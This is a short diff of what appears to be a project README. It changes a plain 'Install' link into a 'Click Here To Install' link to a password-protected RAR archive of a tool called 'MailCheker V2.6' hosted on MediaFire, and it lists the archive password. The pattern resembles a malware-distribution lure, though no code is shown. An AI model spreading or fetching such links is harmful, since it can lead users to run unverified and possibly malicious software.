@@ -25,6 +25,5 @@
 
 
 
-Pass: 12324
-
-Install: https://www.mediafire.com/file/mk8vhevmouea9ib/MailCheker+V2.6.rar/file
+[Click Here To Install](https://www.mediafire.com/file/mk8vhevmouea9ib/MailCheker+V2.6.rar/file)
+[Pass - 12324]
